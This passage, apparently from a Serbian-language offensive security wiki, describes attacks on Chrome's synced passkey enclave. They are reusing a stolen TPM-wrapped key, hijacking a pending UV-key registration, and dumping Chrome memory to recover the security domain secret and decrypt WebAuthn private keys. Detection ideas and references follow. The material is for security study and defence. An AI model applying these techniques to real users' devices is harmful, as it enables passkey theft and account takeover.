   - Upotrebiti ukradeni blob `wrapped_identity_private_key` na TPM-u žrtve za potpisivanje vezivanja zahteva cloud-authenticator-a.
   - Proslediti vrađenu assertion vrednost relying party-ju.
   - Ovo je naročito vredno kada RP prihvata `userVerification=preferred` ili ne odbacuje assertion vrednosti sa **`UV=0`**.
2. **Otmica pending UV-key**<sup>[[4]](#references)</sup>
   - Izazvati ponovno podešavanje brisanjem `passkey_enclave_state` ili slanjem ispravne potpisane operacije `device/forget`.
   - Ako podešavanje ostavi uređaj u stanju **`uv_key_pending`**, registrovati UV javni ključ pod kontrolom napadača.
   - Ako provajder ne proverava attestation / poreklo bezbednog hardvera za novi UV ključ, kasniji potpisi napadačevim ključem smatraju se vrednostima **`UV=1`**.
3. **Krađa master-secret / SDS za oporavak**<sup>[[4]](#references)</sup>
   - Izazvati oporavak ili ponovno pridruživanje, tako da Chrome preuzme master secret za sinhronizovane passkey-je.
   - Pratiti ponovno kreiranje/izmenu `passkey_enclave_state`, a zatim izbaciti dump Chrome memorije dok je običan tekst **security domain secret (SDS)** prisutan u memoriji.
   - Upotrebiti pribavljeni SDS za dešifrovanje šifrovanih polja u svakom zapisu `WebauthnCredentialSpecifics` i oporavak prenosivih WebAuthn privatnih ključeva.

### DFIR / ideje za detekciju

- Pratiti **brisanje/ponovno kreiranje** datoteke `passkey_enclave_state`.<sup>[[4]](#references)</sup>
- Slati upozorenja o neuobičajenom pristupu Chrome-ovom **`Sync Data\LevelDB`** od strane procesa koji nisu pregledači.
- Slati upozorenja o **dump-ovima Chrome memorije** ili sumnjivom pristupu memoriji između procesa.
- Istražiti ponovljene upite za **Google Password Manager recovery PIN** ili neočekivano ponovno podešavanje.
- Imajte na umu da **`signCount`** za WebAuthn često nije koristan kod sinhronizovanih passkey-ja jer može ostati nepromenjen, pa je klasična detekcija kloniranja slaba.

## References

- [1] [Unit 42 – Istraga o višegodišnjim, neotkrivenim operacijama usmerenim na sektore visoke vrednosti](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: phishing pomoću Word VBA makroa preko SMTP-a → dešifrovanje hMailServer akreditiva → Veeam CVE-2023-27532 do SYSTEM nivoa](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Unutar Ink Dragon-a: otkrivanje relay mreže i načina rada prikrivene ofanzivne operacije](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: nova površina za napad u autentifikaciji bez lozinke](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG skladište ključeva](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows: Ataques a Sistemas y Redes Microsoft](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Kako skladište podataka Active Directory-ja zaista funkcioniše: uvid u NTDS.dit (1. deo)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – udaljeni dump Lsass lozinki](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho proširuje svoj arsenal sajber špijunaže pomoću Still toolkita](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – funkcija CreateFileW i `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy režim pravljenja rezervnih kopija `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram FAQ – prekidanje aktivnih sesija](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
